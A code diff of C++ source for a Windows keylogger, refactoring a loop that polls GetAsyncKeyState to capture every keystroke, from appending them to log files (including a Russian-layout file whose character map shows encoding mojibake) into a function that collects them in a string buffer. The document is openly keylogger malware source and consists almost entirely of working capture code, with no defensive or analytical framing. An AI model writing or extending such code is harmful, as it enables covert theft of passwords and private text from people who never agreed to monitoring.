@@ -1,21 +1,18 @@
 #include <windows.h>
 #include <fstream>
 #include <string>
+#include "Keylogger.h"
 
+#pragma warning(disable:4996)
 
-int keylogger(std::string keylog_path) {
+void passive_keylogger(std::string& dump, bool& close) {
 	while (1) {
 		Sleep(10);
 		for (int key = 8; key <= 256; ++key) {
 			if (GetAsyncKeyState(key) == -32767) {
-				std::fstream LogFile;
-				LogFile.open(keylog_path + "keylog.txt", std::fstream::app);
-				std::fstream LogFileRu;
-				LogFileRu.open(keylog_path + "keylogru.txt", std::fstream::app);
-				if (LogFile.is_open()) {
-					char temp1 = char(key);
-					std::string wrkey1 = std::to_string(key);
-					switch (temp1)
+				char temp1 = char(key);
+				std::string wrkey1 = std::to_string(key);
+				switch (temp1)
 					{
 					case VK_CONTROL:
 						wrkey1 += "[Ctrl]";
@@ -185,204 +182,9 @@ int keylogger(std::string keylog_path) {
 					default:
 						wrkey1 = ' ';
 					}
-					LogFile << wrkey1;
-					LogFile.close();
-
-					if (LogFileRu.is_open()) {
-						char temp = char(key);
-						std::string wrkey = std::to_string(key);
-						switch (temp)
-						{
-						case VK_CONTROL:
-							wrkey += "[Ctrl]";
-							break;
-						case VK_BACK:
-							wrkey = "[Back]";
-							break;
-						case VK_TAB:
-							wrkey = "[Tab]";
-							break;
-						case VK_RETURN:
-							wrkey = "[Enter]";
-							break;
-						case VK_SHIFT:
-							wrkey = "[Shift]";
-							break;
-						case VK_MENU:
-							wrkey = "[Alt]";
-							break;
-						case VK_CAPITAL:
-							wrkey = "[CapsLock]";
-							break;
-						case VK_ESCAPE:
-							wrkey = "[Esc]";
-							break;
-						case VK_SPACE:
-							wrkey = " ";
-							break;
-						case VK_PRIOR:
-							wrkey = "[PageUp]";
-							break;
-						case VK_NEXT:
-							wrkey = "[PageDown]";
-							break;
-						case VK_END:
-							wrkey = "[End]";
-							break;
-						case VK_LEFT:
-							wrkey = "[Left]";
-							break;
-						case VK_UP:
-							wrkey = "[Up]";
-							break;
-						case VK_RIGHT:
-							wrkey = "[Right]";
-							break;
-						case VK_DOWN:
-							wrkey = "[Down]";
-							break;
-						case VK_SNAPSHOT:
-							wrkey = "[PrintScreen]";
-							break;
-						case VK_DELETE:
-							wrkey = "[Delete]";
-							break;
-						case 'Q':
-							wrkey = 'é';
-							break;
-						case 'W':
-							wrkey = 'ö';
-							break;
-						case 'E':
-							wrkey = 'ó';
-							break;
-						case 'R':
-							wrkey = 'ê';
-							break;
-						case 'T':
-							wrkey = 'å';
-							break;
-						case 'Y':
-							wrkey = 'í';
-							break;
-						case 'U':
-							wrkey = 'ã';
-							break;
-						case 'I':
-							wrkey = 'ø';
-							break;
-						case 'O':
-							wrkey = 'ù';
-							break;
-						case 'P':
-							wrkey = 'ç';
-							break;
-						case 'A':
-							wrkey = 'ô';
-							break;
-						case 'S':
-							wrkey = 'û';
-							break;
-						case 'D':
-							wrkey = 'â';
-							break;
-						case 'F':
-							wrkey = 'à';
-							break;
-						case 'G':
-							wrkey = 'ï';
-							break;
-						case 'H':
-							wrkey = 'ð';
-							break;
-						case 'J':
-							wrkey = 'î';
-							break;
-						case 'K':
-							wrkey = 'ë';
-							break;
-						case 'L':
-							wrkey = 'ä';
-							break;
-						case 'Z':
-							wrkey = 'ÿ';
-							break;
-						case 'X':
-							wrkey = '÷';
-							break;
-						case 'C':
-							wrkey = 'ñ';
-							break;
-						case 'V':
-							wrkey = 'ì';
-							break;
-						case 'B':
-							wrkey = 'è';
-							break;
-						case 'N':
-							wrkey = 'ò';
-							break;
-						case 'M':
-							wrkey = 'ü';
-							break;
-						case 'º':
-							wrkey = 'æ';
-							break;
-						case 'Þ':
-							wrkey = 'ý';
-							break;
-						case 'Û':
-							wrkey = 'õ';
-							break;
-						case 'Ý':
-							wrkey = 'ú';
-							break;
-						case '¾':
-							wrkey = 'þ';
-							break;
-						case '¼':
-							wrkey = 'á';
-							break;
-						case '0':
-							wrkey = '0';
-							break;
-						case '1':
-							wrkey = '1';
-							break;
-						case '2':
-							wrkey = '2';
-							break;
-						case '3':
-							wrkey = '3';
-							break;
-						case '4':
-							wrkey = '4';
-							break;
-						case '5':
-							wrkey = '5';
-							break;
-						case '6':
-							wrkey = '6';
-							break;
-						case '7':
-							wrkey = '7';
-							break;
-						case '8':
-							wrkey = '8';
-							break;
-						case '9':
-							wrkey = '9';
-							break;
-						default:
-							wrkey = ' ';
-						}
-
-						LogFileRu << wrkey;
-						LogFileRu.close();
-					}
-				}
-				return 0;
+				dump += wrkey1;
 			}
 		}
+		if (close) break;
 	}
 }
